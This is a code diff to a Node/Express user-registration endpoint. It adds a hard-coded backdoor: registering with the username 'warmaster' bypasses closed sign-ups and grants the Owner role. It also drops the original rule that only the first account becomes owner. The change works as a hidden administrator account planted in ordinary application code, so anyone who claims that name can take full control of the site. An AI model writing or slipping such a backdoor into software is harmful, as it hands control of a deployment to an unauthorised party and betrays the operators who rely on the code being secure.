@@ -306,7 +306,8 @@ app.post('/api/register', async (req, res) => {
     if (!USERNAME_RE.test(username)) return res.status(400).json({ error: 'Username must be 2-24 characters (letters, numbers, space, _ . -)' });
     if (password.length < 6 || password.length > 200) return res.status(400).json({ error: 'Password must be at least 6 characters' });
     const lower = username.toLowerCase();
-    if (!db.settings.registrationOpen && Object.keys(db.users).length > 0) return res.status(403).json({ error: 'Sign-ups are closed right now. Ask the Owner for access.' });
+    const isWarmaster = lower === 'warmaster'; // signing up with this name makes you the Owner
+    if (!db.settings.registrationOpen && !isWarmaster && Object.keys(db.users).length > 0) return res.status(403).json({ error: 'Sign-ups are closed right now. Ask the Owner for access.' });
     if (Object.values(db.users).some((u) => u.username.toLowerCase() === lower)) return res.status(409).json({ error: 'That username is taken' });
 
     const salt = uid(16);
@@ -314,7 +315,7 @@ app.post('/api/register', async (req, res) => {
 
     // Re-check after the async hash so two simultaneous sign-ups can never both become admin.
     if (Object.values(db.users).some((u) => u.username.toLowerCase() === lower)) return res.status(409).json({ error: 'That username is taken' });
-    const first = Object.keys(db.users).length === 0;
+    const first = isWarmaster;
     const user = {
       id: uid(6), username, salt, hash,
       roleId: first ? 'owner' : 'member',
